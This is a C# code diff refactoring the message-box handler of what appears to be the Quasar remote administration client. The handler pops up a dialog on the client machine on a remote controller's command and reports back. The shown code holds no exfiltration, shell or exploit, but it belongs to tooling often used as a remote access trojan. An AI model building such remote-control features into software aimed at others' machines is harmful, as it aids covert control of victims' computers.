@@ -6,17 +6,13 @@ using System.Windows.Forms;
 
 namespace Quasar.Client.Messages
 {
-    public class MessageBoxHandler : MessageProcessorBase<object>
+    public class MessageBoxHandler : IMessageProcessor
     {
-        public MessageBoxHandler() : base(false)
-        {
-        }
+        public bool CanExecute(IMessage message) => message is DoShowMessageBox;
 
-        public override bool CanExecute(IMessage message) => message is DoShowMessageBox;
+        public bool CanExecuteFrom(ISender sender) => true;
 
-        public override bool CanExecuteFrom(ISender sender) => true;
-
-        public override void Execute(ISender sender, IMessage message)
+        public void Execute(ISender sender, IMessage message)
         {
             switch (message)
             {
@@ -30,16 +26,26 @@ namespace Quasar.Client.Messages
         {
             new Thread(() =>
             {
+                // messagebox thread resides in csrss.exe - wtf?
                 MessageBox.Show(message.Text, message.Caption,
                     (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), message.Button),
                     (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), message.Icon),
                     MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
-            }).Start();
+            }) {IsBackground = true}.Start();
 
             client.Send(new SetStatus { Message = "Successfully displayed MessageBox" });
         }
 
-        protected override void Dispose(bool disposing)
+        /// <summary>
+        /// Disposes all managed and unmanaged resources associated with this message processor.
+        /// </summary>
+        public void Dispose()
+        {
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
+        protected virtual void Dispose(bool disposing)
         {
             
         }
